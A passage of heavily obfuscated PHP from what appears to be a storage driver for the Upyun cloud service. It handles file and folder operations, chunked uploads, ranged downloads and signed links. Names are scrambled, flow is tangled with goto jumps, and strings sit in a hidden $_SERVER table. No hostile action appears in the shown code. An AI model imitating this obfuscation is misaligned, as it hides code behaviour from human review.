$EŞŞÓ÷Ÿ”[$AÚ­Ô¯Åâ[1316]]; } } } return array($AÚ­Ô¯Åâ[1069] => $a„’ÌÊù®à[$AÚ­Ô¯Åâ[697]], $AÚ­Ô¯Åâ[1071] => $EŞŞÓ÷Ÿ”); goto eÏ²ØÕİ¨Í; eÏ²ØÕİ¨Í: } public function mkfile($f°æ¢´Šï™, $bÁèÕÛÓ× = '', $B•ø†Àâœ± = REPEAT_RENAME) { if ($this->setContent($f°æ¢´Šï™, $bÁèÕÛÓ×)) { return $this->getPathOuter($f°æ¢´Šï™); } return !1; } public function mkdir($cš¶¯ñ£Û, $F½ò­ãÚÁ = REPEAT_SKIP) { $fù‰ç®óçÅ =& $_SERVER[Ïº«‚ßèÔˆø]; $a›Úˆë¤ËÆ = trim($cš¶¯ñ£Û, $fù‰ç®óçÅ[8]); if ($this->_isFolder($a›Úˆë¤ËÆ)) { return $this->getPathOuter($a›Úˆë¤ËÆ); } $fš…Ğ„ÜŸ‡ = array($fù‰ç®óçÅ[1317]); $AÊ–’»¯° = $this->ussRequest($a›Úˆë¤ËÆ, $fù‰ç®óçÅ[223], !1, $fš…Ğ„ÜŸ‡); return $AÊ–’»¯°[$fù‰ç®óçÅ[1069]] ? $this->getPathOuter($a›Úˆë¤ËÆ) : !1; } public function copyFile($CùÜÇ„è›, $EÇí–ìĞ) { $f¦Ê½Ñ²–Ÿ =& $_SERVER[Ïº«‚ßèÔˆø]; $c•Ô¹Éƒ« = array($f¦Ê½Ñ²–Ÿ[1318] . "\57{$this->bucket}\x2f{$CùÜÇ„è›}", $f¦Ê½Ñ²–Ÿ[1319]); $EÑ’ç¼¸¯á = $this->ussRequest($EÇí–ìĞ, $f¦Ê½Ñ²–Ÿ[225], !1, $c•Ô¹Éƒ«); return $EÑ’ç¼¸¯á[$f¦Ê½Ñ²–Ÿ[1069]] ? !0 : $this->getPathOuter($EÇí–ìĞ); } public function moveFile($e‡¨´Ó–¬Î, $cÁô¡ÙïäÖ) { $b’—†ìŒÛÄ =& $_SERVER[Ïº«‚ßèÔˆø]; $DŠÕå¶¼™Ç = array($b’—†ìŒÛÄ[1320] . "\x2f{$this->bucket}\x2f{$e‡¨´Ó–¬Î}", $b’—†ìŒÛÄ[1319]); $BË„‚—Ã‘ğ = $this->ussRequest($cÁô¡ÙïäÖ, $b’—†ìŒÛÄ[225], !1, $DŠÕå¶¼™Ç); return $BË„‚—Ã‘ğ[$b’—†ìŒÛÄ[1069]] ? !0 : $this->getPathOuter($cÁô¡ÙïäÖ); } public function delFile($FÌğ×–½ÕÌ) { $fò¾‚ò°ÄØ =& $_SERVER[Ïº«‚ßèÔˆø]; $eëù‚ßƒìİ = $this->ussRequest($FÌğ×–½ÕÌ, $fò¾‚ò°ÄØ[1321]); return $eëù‚ßƒìİ[$fò¾‚ò°ÄØ[1069]] ? !0 : !1; } public function delFolder($DªÕ‰×ÅŒ–) { goto B£ ì‡øîİ; aƒÇŸ£½‘Œ: return $b¯’†ğ±‘[$f«®«Ò„Ñ¼[1069]]; goto d¼›Æ©Û‚ì; B£ ì‡øîİ: $f«®«Ò„Ñ¼ =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$this->exist($DªÕ‰×ÅŒ–)) { return !0; } $this->listItemCache = !1; goto b•ÌÏáˆ‡Å; b•ÌÏáˆ‡Å: $d°¾Çßß” = $d¼ƒ˜Œ†ˆ = array(); $this->fileList($DªÕ‰×ÅŒ–, $d°¾Çßß”, $d¼ƒ˜Œ†ˆ, !0); $this->listItemCache = !0; goto b¯±ÇÑ±Å°; b¯±ÇÑ±Å°: foreach ($d¼ƒ˜Œ†ˆ as $A ŸØÌàÈ¿) { $b¯’†ğ±‘ = $this->ussRequest($A ŸØÌàÈ¿[$f«®«Ò„Ñ¼[28]], $f«®«Ò„Ñ¼[1321]); if (!$b¯’†ğ±‘[$f«®«Ò„Ñ¼[1069]]) { return !1; } } foreach ($d°¾Çßß” as $f“†…ã¦£à) { $b¯’†ğ±‘ = $this->ussRequest($f“†…ã¦£à, $f«®«Ò„Ñ¼[1321]); if (!$b¯’†ğ±‘[$f«®«Ò„Ñ¼[1069]]) { return !1; } } $b¯’†ğ±‘ = $this->ussRequest($DªÕ‰×ÅŒ–, $f«®«Ò„Ñ¼[1321]); goto aƒÇŸ£½‘Œ; d¼›Æ©Û‚ì: } public function rename($B”Ú©¬áÏ­, $Dí¨œæ¥ìò) { if ($this->isFile($B”Ú©¬áÏ­)) { $Dí¨œæ¥ìò = get_path_father($B”Ú©¬áÏ­) . $Dí¨œæ¥ìò; return $this->moveFile($B”Ú©¬áÏ­, $Dí¨œæ¥ìò); } return $this->renameObject($B”Ú©¬áÏ­, $Dí¨œæ¥ìò); } public function fileInfo($B£¢œ„Š‚ğ, $E¥šˆ•à¶ = false, $Eà£ø„òÔè = array()) { goto f¬ŒŒÊ˜Ë•; f‡…»ó•Ê¤: $D°µÜé²¬Ë[$E„Øœ©À¡[193]] = $D°µÜé²¬Ë[$E„Øœ©À¡[84]] = 0; $D°µÜé²¬Ë[$E„Øœ©À¡[194]] = $D°µÜé²¬Ë[$E„Øœ©À¡[195]] = !0; if (empty($Eà£ø„òÔè)) { $Eà£ø„òÔè = $this->objectMeta($B£¢œ„Š‚ğ); if (!$Eà£ø„òÔè) { return $D°µÜé²¬Ë; } } goto cÌ‘ô¦òåİ; f¬ŒŒÊ˜Ë•: $E„Øœ©À¡ =& $_SERVER[Ïº«‚ßèÔˆø]; $D°µÜé²¬Ë = array($E„Øœ©À¡[28] => $this->pathThis($B£¢œ„Š‚ğ), $E„Øœ©À¡[76] => $this->getPathOuter($E„Øœ©À¡[8] . $B£¢œ„Š‚ğ), $E„Øœ©À¡[29] => $E„Øœ©À¡[192], $E„Øœ©À¡[78] => isset($Eà£ø„òÔè[$E„Øœ©À¡[78]]) ? $Eà£ø„òÔè[$E„Øœ©À¡[78]] : 0, $E„Øœ©À¡[168] => $this->ext($B£¢œ„Š‚ğ)); if ($E¥šˆ•à¶) { return $D°µÜé²¬Ë; } goto f‡…»ó•Ê¤; cÌ‘ô¦òåİ: $D°µÜé²¬Ë[$E„Øœ©À¡[193]] = intval($Eà£ø„òÔè[$E„Øœ©À¡[1322]]); $D°µÜé²¬Ë[$E„Øœ©À¡[84]] = intval($Eà£ø„òÔè[$E„Øœ©À¡[1323]]); $D°µÜé²¬Ë[$E„Øœ©À¡[78]] = $Eà£ø„òÔè[$E„Øœ©À¡[78]]; goto F¬Ï¬ñäÒ‹; F¬Ï¬ñäÒ‹: return $D°µÜé²¬Ë; goto E±§ë°ä­; E±§ë°ä­: } public function folderInfo($d‚í¦æ”’†, $AÌ²ÖöŞÄä = false) { goto aŒõŸ¬Õ†Ø; aŒõŸ¬Õ†Ø: $aÕ¿®„š„ƒ =& $_SERVER[Ïº«‚ßèÔˆø]; $a  ÏÙ®”ù = array($aÕ¿®„š„ƒ[28] => $this->pathThis($d‚í¦æ”’†), $aÕ¿®„š„ƒ[76] => $this->getPathOuter($aÕ¿®„š„ƒ[8] . $d‚í¦æ”’†), $aÕ¿®„š„ƒ[29] => $aÕ¿®„š„ƒ[77]); if ($AÌ²ÖöŞÄä) { return $a  ÏÙ®”ù; } goto Bİ³ÂŒêš¢; E¬½ÌÎé“Ä: $a  ÏÙ®”ù[$aÕ¿®„š„ƒ[193]] = intval($f¡‘§°ô˜[$aÕ¿®„š„ƒ[1322]]); $a  ÏÙ®”ù[$aÕ¿®„š„ƒ[84]] = intval($f¡‘§°ô˜[$aÕ¿®„š„ƒ[1323]]); return $a  ÏÙ®”ù; goto BƒÉ±ï§í‡; Bİ³ÂŒêš¢: $a  ÏÙ®”ù[$aÕ¿®„š„ƒ[193]] = $a  ÏÙ®”ù[$aÕ¿®„š„ƒ[84]] = 0; $a  ÏÙ®”ù[$aÕ¿®„š„ƒ[194]] = $a  ÏÙ®”ù[$aÕ¿®„š„ƒ[195]] = !0; if (empty($f¡‘§°ô˜)) { $f¡‘§°ô˜ = $this->objectMeta($d‚í¦æ”’†); if (!$f¡‘§°ô˜) { return $a  ÏÙ®”ù; } } goto E¬½ÌÎé“Ä; BƒÉ±ï§í‡: } private function listObjs($cİìèÙÀÊÈ, $C†³†§²î… = 0, $a±—à„ƒÊ = 1000) { $CÚÎô½„È‹ =& $_SERVER[Ïº«‚ßèÔˆø]; $A¥Ø©ğš’ä = array($CÚÎô½„È‹[1324], $CÚÎô½„È‹[1325] . $a±—à„ƒÊ); if ($C†³†§²î…) { $A¥Ø©ğš’ä[] = $CÚÎô½„È‹[1326] . $C†³†§²î…; } $E ë¼£—²Ù = $this->ussRequest($cİìèÙÀÊÈ, $CÚÎô½„È‹[227], !1, $A¥Ø©ğš’ä); return !$E ë¼£—²Ù[$CÚÎô½„È‹[1069]] ? !1 : $E ë¼£—²Ù[$CÚÎô½„È‹[1071]]; } private function fileList($Bê”ÛƒÑÀ¼, &$C„Û³ë—äÓ, &$CÊ­»–ö®‹, $d­Ú³µù = false) { goto bÛã‹Ìºà; dŞªàä‘ä: $b¢ãµŒ…’Ù = rtrim($Bê”ÛƒÑÀ¼, $ašŞœÆª³Å[8]) . $ašŞœÆª³Å[8]; $FÊËŞ¢èŠÇ = $this->listItemCache === !1 ? !1 : !0; while (!0) { check_abort(); $f¹ŒÉâÄƒš = $this->listObjs($Bê”ÛƒÑÀ¼, $dŞÈó£ÜË, $eùˆ¤…¤‡); if (!$f¹ŒÉâÄƒš) { return !1; } $dŞÈó£ÜË = isset($f¹ŒÉâÄƒš[$ašŞœÆª³Å[1327]]) ? $f¹ŒÉâÄƒš[$ašŞœÆª³Å[1327]] : $ašŞœÆª³Å[33]; $B¾³—š§Ñ = isset($f¹ŒÉâÄƒš[$ašŞœÆª³Å[1328]]) ? $f¹ŒÉâÄƒš[$ašŞœÆª³Å[1328]] : array(); foreach ($B¾³—š§Ñ as $f¯ÍîŒ°) { $b•®èŒèèÍ = $f¯ÍîŒ°[$ašŞœÆª³Å[29]] == $ašŞœÆª³Å[77] ? !0 : !1; $FÂ×•¡Á = ltrim($b¢ãµŒ…’Ù . $f¯ÍîŒ°[$ašŞœÆª³Å[28]], $ašŞœÆª³Å[8]) . ($b•®èŒèèÍ ? $ašŞœÆª³Å[8] : $ašŞœÆª³Å[33]); $aõã«Ê¬½ = array($ašŞœÆª³Å[28] => $FÂ×•¡Á, $ašŞœÆª³Å[29] => $b•®èŒèèÍ ? $ašŞœÆª³Å[77] : $ašŞœÆª³Å[192], $ašŞœÆª³Å[78] => $f¯ÍîŒ°[$ašŞœÆª³Å[334]], $ašŞœÆª³Å[1323] => $f¯ÍîŒ°[$ašŞœÆª³Å[1329]]); if ($FÊËŞ¢èŠÇ) { $this->cacheMethod($ašŞœÆª³Å[198], $FÂ×•¡Á, $b•®èŒèèÍ); $this->cacheMethod($ašŞœÆª³Å[199], $FÂ×•¡Á, $aõã«Ê¬½); } if ($b•®èŒèèÍ) { $C„Û³ë—äÓ[] = $FÂ×•¡Á; if ($d­Ú³µù) { $this->fileList($FÂ×•¡Á, $C„Û³ë—äÓ, $CÊ­»–ö®‹, $d­Ú³µù); } continue; } $CÊ­»–ö®‹[] = $aõã«Ê¬½; } if (count($B¾³—š§Ñ) < $eùˆ¤…¤‡) { break; } } goto fØĞ¦¹Š²–; fØĞ¦¹Š²–: if ($FÊËŞ¢èŠÇ) { $this->cacheMethod($ašŞœÆª³Å[198], $Bê”ÛƒÑÀ¼, !0); } goto b’ˆŸ“†Ÿ«; bÛã‹Ìºà: $ašŞœÆª³Å =& $_SERVER[Ïº«‚ßèÔˆø]; $dŞÈó£ÜË = $ašŞœÆª³Å[33]; $eùˆ¤…¤‡ = 1000; goto dŞªàä‘ä; b’ˆŸ“†Ÿ«: } public function listPath($cº¤šôéêÑ, $cŒ‘³šì•Š = false) { $d»‹Ì®¥ğ =& $_SERVER[Ïº«‚ßèÔˆø]; $eì ÷“ñ¯ = $e²óÔÖÈµÇ = array(); $this->fileList($cº¤šôéêÑ, $eì ÷“ñ¯, $e²óÔÖÈµÇ); foreach ($eì ÷“ñ¯ as $B¾‡¿‘ìÄÑ => $Få›ÒŸ·Ñ) { $eì ÷“ñ¯[$B¾‡¿‘ìÄÑ] = $this->folderInfo($Få›ÒŸ·Ñ, $cŒ‘³šì•Š); } foreach ($e²óÔÖÈµÇ as $B¾‡¿‘ìÄÑ => $Få›ÒŸ·Ñ) { $e²óÔÖÈµÇ[$B¾‡¿‘ìÄÑ] = $this->fileInfo($Få›ÒŸ·Ñ[$d»‹Ì®¥ğ[28]], $cŒ‘³šì•Š, $Få›ÒŸ·Ñ); } return array($d»‹Ì®¥ğ[75] => $eì ÷“ñ¯, $d»‹Ì®¥ğ[74] => $e²óÔÖÈµÇ); } public function has($FŒø‰•íÚ, $FÍÛ Ç»¨Š = false, $CØµÌ›‚®Ã = true) { goto d˜…ÍÑšã; e¡ˆéˆ×ßª: $aáµáœâ„ = 0; $FŞò‚Ğ¸È¾ = 0; $Aøõ»ˆ¿ŒÉ = rtrim($FŒø‰•íÚ, $DÉÂá òÃÎ[8]) . $DÉÂá òÃÎ[8]; goto B‚Î¬«Å‚‹; d˜…ÍÑšã: $DÉÂá òÃÎ =& $_SERVER[Ïº«‚ßèÔˆø]; $BÅéÇ¦¢òå = $DÉÂá òÃÎ[33]; $bÎ¢§†‰ÒÜ = 500; goto e¡ˆéˆ×ßª; B‚Î¬«Å‚‹: while (!0) { check_abort(); $EÆ¸Â§ô²¦ = $this->listObjs($FŒø‰•íÚ, $BÅéÇ¦¢òå, $bÎ¢§†‰ÒÜ); if (!$EÆ¸Â§ô²¦) { return !1; } $BÅéÇ¦¢òå = isset($EÆ¸Â§ô²¦[$DÉÂá òÃÎ[1327]]) ? $EÆ¸Â§ô²¦[$DÉÂá òÃÎ[1327]] : $DÉÂá òÃÎ[33]; $BÊßƒã“õ¿ = isset($EÆ¸Â§ô²¦[$DÉÂá òÃÎ[1328]]) ? $EÆ¸Â§ô²¦[$DÉÂá òÃÎ[1328]] : array(); if (empty($BÊßƒã“õ¿)) { break; } $AŞ±³ƒ = array_filter($BÊßƒã“õ¿, function ($D‘Ş¶õØã) { $A¦à­£¸ =& $_SERVER[Ïº«‚ßèÔˆø]; return $D‘Ş¶õØã[$A¦à­£¸[29]] == $A¦à­£¸[77]; }); $EŠĞß‹ ‰é = count($BÊßƒã“õ¿); $AŞ±³ƒ = count($AŞ±³ƒ); $A†‰§¢ò«Á = $EŠĞß‹ ‰é - $AŞ±³ƒ; if ($FÍÛ Ç»¨Š) { $FŞò‚Ğ¸È¾ += $AŞ±³ƒ; $aáµáœâ„ += $A†‰§¢ò«Á; if ($EŠĞß‹ ‰é < $bÎ¢§†‰ÒÜ) { break; } continue; } if ($CØµÌ›‚®Ã) { if ($A†‰§¢ò«Á) { return !0; } } else { if ($AŞ±³ƒ) { return !0; } } if ($EŠĞß‹ ‰é < $bÎ¢§†‰ÒÜ) { break; } } if ($FÍÛ Ç»¨Š) { return array($DÉÂá òÃÎ[202] => $aáµáœâ„, $DÉÂá òÃÎ[203] => $FŞò‚Ğ¸È¾); } return !1; goto Dùó­ˆĞ“½; Dùó­ˆĞ“½: } public function listAll($C¸†‚ï‡º) { goto AŞ„Ã›Ä‚; AŞ„Ã›Ä‚: $c‚½«Õºİù =& $_SERVER[Ïº«‚ßèÔˆø]; $a÷­Èà = $C±Û˜ØÙŠÒ = array(); $this->fileList($C¸†‚ï‡º, $a÷­Èà, $C±Û˜ØÙŠÒ, !0); goto bäâ‚…²†; bÖÉ°©áéÙ: return $this->listAllFiles($C¸†‚ï‡º, array_keys($báªÄ¬˜­), $báªÄ¬˜­); goto aœµ¨Í¨øœ; bäâ‚…²†: $báªÄ¬˜­ = array(); foreach ($C±Û˜ØÙŠÒ as $DÈ´²­áÉˆ) { $báªÄ¬˜­[$DÈ´²­áÉˆ[$c‚½«Õºİù[28]]] = $DÈ´²­áÉˆ[$c‚½«Õºİù[78]]; } foreach ($a÷­Èà as $DÈ´²­áÉˆ) { if (is_string($DÈ´²­áÉˆ)) { $báªÄ¬˜­[$DÈ´²­áÉˆ] = 0; } } goto bÖÉ°©áéÙ; aœµ¨Í¨øœ: } public function canRead($B­ÎÑ÷Ú—ì) { return $this->exist($B­ÎÑ÷Ú—ì) ? !0 : !1; } public function canWrite($eÌãø š‹˜) { return $this->exist($eÌãø š‹˜) ? !0 : !1; } public function getContent($eĞÄó£¼Åì) { return $this->fileSubstr($eĞÄó£¼Åì, 0, -1); } public function setContent($d¾ƒÏ‘à×, $d¹ì”ºùÙ½ = '') { $f›Á¨ø½Û =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$d¹ì”ºùÙ½) { $Aóš¿‹Íë¥ = $this->ussRequest($d¾ƒÏ‘à×, $f›Á¨ø½Û[223]); return $Aóš¿‹Íë¥[$f›Á¨ø½Û[1069]]; } $eËƒ¦¹È®Ÿ = $this->tempFile($this->pathThis($d¾ƒÏ‘à×)); file_put_contents($eËƒ¦¹È®Ÿ, $d¹ì”ºùÙ½); if ($this->upload($d¾ƒÏ‘à×, $eËƒ¦¹È®Ÿ)) { $this->tempFileRemve($eËƒ¦¹È®Ÿ); return !0; } return !1; } public function fileSubstr($b„š´è°¾ª, $a°Çƒ­ÒÏÃ, $Dã£ÌƒÑğº) { $f¶Å¥ôÔê =& $_SERVER[Ïº«‚ßèÔˆø]; if (!($c¯Œ¥˜éÖ = $this->link($b„š´è°¾ª))) { return !1; } $C¶ËÂ¨¤·‹ = !1; if ($Dã£ÌƒÑğº > 0) { $DšÌàİËí = $a°Çƒ­ÒÏÃ + $Dã£ÌƒÑğº - 1; $C¶ËÂ¨¤·‹ = array($f¶Å¥ôÔê[1290] . $a°Çƒ­ÒÏÃ . $f¶Å¥ôÔê[438] . $DšÌàİËí); } $e§õÑš·ê® = url_request($c¯Œ¥˜éÖ, $f¶Å¥ôÔê[227], !1, $C¶ËÂ¨¤·‹); return $e§õÑš·ê®[$f¶Å¥ôÔê[697]] ? $e§õÑš·ê®[$f¶Å¥ôÔê[1071]] : !1; } public function upload($e„¸˜Ì‚‰Š, $C©º‹‰í‡, $A»‘¾õ©í = false, $EÏìŒ†”±É = REPEAT_REPLACE) { goto EÛÚñ½‰¥Ë; EÛÚñ½‰¥Ë: $d½²ÚÆ›í =& $_SERVER[Ïº«‚ßèÔˆø]; $Fš–ºŠùŒÏ = IO::size($C©º‹‰í‡); if ($Fš–ºŠùŒÏ <= 1024 * 1024 * 200) { $EŸğÊåÏ = array($d½²ÚÆ›í[1330] . $C©º‹‰í‡); $fÅå¡çßœ‹ = $this->ussRequest($e„¸˜Ì‚‰Š, $d½²ÚÆ›í[225], $EŸğÊåÏ); return $fÅå¡çßœ‹[$d½²ÚÆ›í[1069]] ? $this->getPathOuter($e„¸˜Ì‚‰Š) : !1; } goto d³¡¦‚ê¨Â; cÙÖÄ‹Ø¬: if (!$fÅå¡çßœ‹[$d½²ÚÆ›í[1069]]) { return !1; } $D´‘½…òŸ = $fÅå¡çßœ‹[$d½²ÚÆ›í[1071]]; $Fíñ‡ĞÔªÛ = 0; goto f‚Şù¼¸îÆ; dğ¶”É‰×­: $fÅå¡çßœ‹ = $this->ussRequest($e„¸˜Ì‚‰Š, $d½²ÚÆ›í[225], !1, $c³ ÖÁƒ¬¢); return $fÅå¡çßœ‹[$d½²ÚÆ›í[1069]] ? $this->getPathOuter($eòåâÓñ˜·) : !1; goto eÔ©Ò×ğ¿å; EÑ¯Ø‘øÜƒ: do { $bƒÁ½×áĞà = $D´‘½…òŸ[$d½²ÚÆ›í[1336]]; fseek_64($AË ÛÓÆÈÊ, $Fíñ‡ĞÔªÛ); $aó†ŒÄç = fread($AË ÛÓÆÈÊ, $bƒÁ½×áĞà); $b—¦âç™Ñ = 0; do { $b—¦âç™Ñ++; $D´‘½…òŸ = $this->uploadPart($e„¸˜Ì‚‰Š, $D´‘½…òŸ, $aó†ŒÄç); } while (!$D´‘½…òŸ && $b—¦âç™Ñ < 3); if (!$D´‘½…òŸ) { return !1; } $f¡—ß†· = $D´‘½…òŸ[$d½²ÚÆ›í[1335]]; $Fíñ‡ĞÔªÛ += $bƒÁ½×áĞà; } while ($f¡—ß†· != -1); fclose($AË ÛÓÆÈÊ); $c³ ÖÁƒ¬¢ = array($d½²ÚÆ›í[1337], $d½²ÚÆ›í[1338] . $D´‘½…òŸ[$d½²ÚÆ›í[1339]], $d½²ÚÆ›í[1333]); goto dğ¶”É‰×­; d³¡¦‚ê¨Â: $E²¨°ì¬âÁ = 1024 * 1024 * 10; $c³ ÖÁƒ¬¢ = array($d½²ÚÆ›í[1331], $d½²ÚÆ›í[1332] . $Fš–ºŠùŒÏ, $d½²ÚÆ›í[1333], $d½²ÚÆ›í[1334] . $E²¨°ì¬âÁ); $fÅå¡çßœ‹ = $this->ussRequest($e„¸˜Ì‚‰Š, $d½²ÚÆ›í[225], !1, $c³ ÖÁƒ¬¢); goto cÙÖÄ‹Ø¬; f‚Şù¼¸îÆ: $f¡—ß†· = $D´‘½…òŸ[$d½²ÚÆ›í[1335]]; $AË ÛÓÆÈÊ = fopen($C©º‹‰í‡, $d½²ÚÆ›í[1240]); if (!$AË ÛÓÆÈÊ) { return !1; } goto EÑ¯Ø‘øÜƒ; eÔ©Ò×ğ¿å: } private function uploadPart($e¯†¨ã‰±Ë, $b‚ĞÄÅÌ÷¿, &$bğ•Í¦Ìå) { $B…ÈÀí‰” =& $_SERVER[Ïº«‚ßèÔˆø]; $bé÷ŸËÄèÊ = array($B…ÈÀí‰”[1340], $B…ÈÀí‰”[1338] . $b‚ĞÄÅÌ÷¿[$B…ÈÀí‰”[1339]], $B…ÈÀí‰”[1341] . $b‚ĞÄÅÌ÷¿[$B…ÈÀí‰”[1335]], $B…ÈÀí‰”[141] . $b‚ĞÄÅÌ÷¿[$B…ÈÀí‰”[1336]]); $AÅÛ–ÑÒ»® = $this->ussRequest($e¯†¨ã‰±Ë, $B…ÈÀí‰”[225], $bğ•Í¦Ìå, $bé÷ŸËÄèÊ); return !$AÅÛ–ÑÒ»®[$B…ÈÀí‰”[1069]] ? $AÅÛ–ÑÒ»®[$B…ÈÀí‰”[1069]] : $AÅÛ–ÑÒ»®[$B…ÈÀí‰”[1071]]; } public function uploadFormData($a´ì©™½ÔŒ, $bã»„åŸ‡™ = 3600) { return $this->uploadPolicy($a´ì©™½ÔŒ, $bã»„åŸ‡™); } public function multiUploadFormData($f…‚§”ô¢, $D†‘ºËê°Ã = 3600) { $fôº¶„–² =& $_SERVER[Ïº«‚ßèÔˆø]; $B¤½İ¨±è = (int) $GLOBALS[$fôº¶„–²[7]][$fôº¶„–²[78]]; return $this->uploadPolicy($f…‚§”ô¢, $D†‘ºËê°Ã, $B¤½İ¨±è); } private function uploadPolicy($bœøïÆÍŠñ, $A‚»™ÜÃé = 3600, $fĞáÉºœ¬Ö = 0) { goto Cäöëø÷õÅ; cŞÀ­ŠºŸË: $Dƒß”À­°² = array($cŒ—…‘­êï[1342] => $this->bucket, $cŒ—…‘­êï[1343] => $bœøïÆÍŠñ, $cŒ—…‘­êï[1344] => time() + $A‚»™ÜÃé, $cŒ—…‘­êï[1345] => $bòÎêæ„‰õ); if ($fĞáÉºœ¬Ö) { $Dƒß”À­°²[$cŒ—…‘­êï[1256]] = $fĞáÉºœ¬Ö; } $cßší­‘ÚÎ = base64_encode(json_encode($Dƒß”À­°²)); goto F¿ô…ŸÓ„; Cäöëø÷õÅ: $cŒ—…‘­êï =& $_SERVER[Ïº«‚ßèÔˆø]; $c¬¾Âñš¾£ = $cŒ—…‘­êï[8] . $this->bucket; $bòÎêæ„‰õ = gmdate($cŒ—…‘­êï[1277]); goto cŞÀ­ŠºŸË; F¿ô…ŸÓ„: $dó‹Ã÷®¹· = base64_encode(hash_hmac($cŒ—…‘­êï[1312], "\x50\117\x53\124\46{$c¬¾Âñš¾£}\x26{$bòÎêæ„‰õ}\46{$cßší­‘ÚÎ}", md5("{$this->userpass}"), !0)); $EĞæ÷Á•ì· = array($cŒ—…‘­êï[1182] => $cßší­‘ÚÎ, $cŒ—…‘­êï[1346] => "\x55\x50\131\125\x4e\40{$this->username}\72{$dó‹Ã÷®¹·}", $cŒ—…‘­êï[175] => $this->endpoint . $c¬¾Âñš¾£); return $EĞæ÷Á•ì·; goto cˆµĞ¤Ùâå; cˆµĞ¤Ùâå: } public function download($D¶¯†À–îõ, $AÖîé†±¸) { goto b§åÉØµËô; B­¯¯æ“”ë: fclose($dØ—¨Ğ•¹); return $AÖîé†±¸; goto f÷ÓÒò§Ä; b§åÉØµËô: $D¯µÍÓÍß = IO::getPathInner(IO::mkfile($AÖîé†±¸)); if (!($FÆëˆº½“ê = $this->link($D¶¯†À–îõ))) { return !1; } $fÉ‹Æ±ç = 0; goto A™·¦øãé; A™·¦øãé: $CµÂ£‹¡ƒ£ = 1024 * 200; $dØ—¨Ğ•¹ = fopen($D¯µÍÓÍß, $_SERVER[Ïº«‚ßèÔˆø][1296]); while (!0) { $A¨Ï›È¹¤ = $this->fileSubstr($D¶¯†À–îõ, $fÉ‹Æ±ç, $CµÂ£‹¡ƒ£); if ($A¨Ï›È¹¤ === !1) { return !1; } fwrite($dØ—¨Ğ•¹, $A¨Ï›È¹¤); $fÉ‹Æ±ç += $CµÂ£‹¡ƒ£; if (strlen($A¨Ï›È¹¤) < $CµÂ£‹¡ƒ£) { break; } } goto B­¯¯æ“”ë; f÷ÓÒò§Ä: } public function link($F‹£É† äç, $b¼«Óšô‰ç = array()) { $F‚†È»—¸ =& $_SERVER[Ïº«‚ßèÔˆø]; $F‹£É† äç = trim($F‹£É† äç, $F‚†È»—¸[8]); if (!empty($this->token)) { $a‰Ğ£©™ = strtotime(date($F‚†È»—¸[1347])); $f¤¹Œ‡®Ó¸ = substr(md5($this->token . $F‚†È»—¸[281] . $a‰Ğ£©™ . $F‚†È»—¸[1348] . $F‹£É† äç), 12, 8) . $a‰Ğ£©™; $b¼«Óšô‰ç[] = $F‚†È»—¸[1349] . $f¤¹Œ‡®Ó¸; } $b‰„´”ã•¦ = !empty($b¼«Óšô‰ç) ? $F‚†È»—¸[70] . implode($F‚†È»—¸[281], $b¼«Óšô‰ç) : $F‚†È»—¸[33]; return $this->getHost() . $F‚†È»—¸[8] . $F‹£É† äç . $b‰„´”ã•¦; } public function fileOut($E—²Œ»ß™, $FåÀ‘Å›¾‹ = false, $D±»¹ù»ïø = false, $bÆõƒÆ´¬½ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($E—²Œ»ß™, $FåÀ‘Å›¾‹, $D±»¹ù»ïø, $bÆõƒÆ´¬½); } if (!$D±»¹ù»ïø) { $D±»¹ù»ïø = $this->pathThis($E—²Œ»ß™); } $A×ïÍäšÖ = $FåÀ‘Å›¾‹ ? array($_SERVER[Ïº«‚ßèÔˆø][1350] . rawurlencode($D±»¹ù»ïø)) : array(); $a´ğôÆ• = $this->link($E—²Œ»ß™, $A×ïÍäšÖ); $this->fileOutLink($a´ğôÆ•); } public function fileOutServer($C×ï– ×‡, $fèãÉ†ÉÛ = false, $AŠ‹ôö’Ø† = false, $B¯©Ş¯á = '') { parent::fileOut($C×ï– ×‡, $fèãÉ†ÉÛ, $AŠ‹ôö’Ø†, $B¯©Ş¯á); } public function fileOutImage($D‘ ­¤Ë©ç, $Dš¾¢½ç‰» = 250) { $fá¸„ÏÅ¸å = $this->link($D‘ ­¤Ë©ç . $_SERVER[Ïº«‚ßèÔˆø][1351] . $Dš¾¢½ç‰»); $this->fileOutLink($fá¸„ÏÅ¸å); } public function fileOutImageServer($díù¢¶ïÁ, $aØùÚùáÁ = 250) { parent::fileOutImage($díù¢¶ïÁ, $aØùÚùáÁ); } public function hashMd5($e‡á…—å´²) { $cßÈ‘ÚÔ«­ =& $_SERVER[Ïº«‚ßèÔˆø]; $AèË÷Ñ´Œ¨ = $this->_objectMeta($e‡á…—å´²); return isset($AèË÷Ñ´Œ¨[$cßÈ‘ÚÔ«­[207]]) ? $AèË÷Ñ´Œ¨[$cßÈ‘ÚÔ«­[207]] : !1; } public function size($b×µŒ¿ŠÃõ) { $d—£‹ËÅ–ë = $this->objectMeta($b×µŒ¿ŠÃõ); return $d—£‹ËÅ–ë ? $d—£‹ËÅ–ë[$_SERVER[Ïº«‚ßèÔˆø][78]] : 0; } public function info($eÚŸ²»À™) { if ($this->isFolder($eÚŸ²»À™)) { return $this->folderInfo($eÚŸ²»À™); } else { if ($this->isFile($eÚŸ²»À™)) { return $this->fileInfo($eÚŸ²»À™); } } return !1; } public function exist($Fñ»ºÖáô•) { return $this->isFile($Fñ»ºÖáô•) || $this->isFolder($Fñ»ºÖáô•); } public function isFile($f·×¾ÃõßÉ) { return !$this->isFolder($f·×¾ÃõßÉ) && $this->objectMeta($f·×¾ÃõßÉ); } public function isFolder($CÁ¦³•¢Í×) { return $this->cacheMethod($_SERVER[Ïº«‚ßèÔˆø][198], $CÁ¦³•¢Í×); } protected function objectMeta($fÎ¼ÕÚôŒŸ) { return $this->cacheMethod($_SERVER[Ïº«‚ßèÔˆø][199], $fÎ¼ÕÚôŒŸ); } protected function _objectMeta($câ„ÄçÀ¥ƒ) { goto F«Ìµ¹ª¢ó; D××š‘³‘ù: if (!$EïÑíÁ‰œª[$c¾ÑÄ©Ñ¤æ[1069]]) { return null; } $FæƒÕšæ´ = isset($EïÑíÁ‰œª[$c¾ÑÄ©Ñ¤æ[1071]]) ? $EïÑíÁ‰œª[$c¾ÑÄ©Ñ¤æ[1071]] : array(); if (!isset($FæƒÕšæ´[$c¾ÑÄ©Ñ¤æ[1353]])) { return null; } goto bÂ†»ÉÂ‹ö; bÂ†»ÉÂ‹ö: 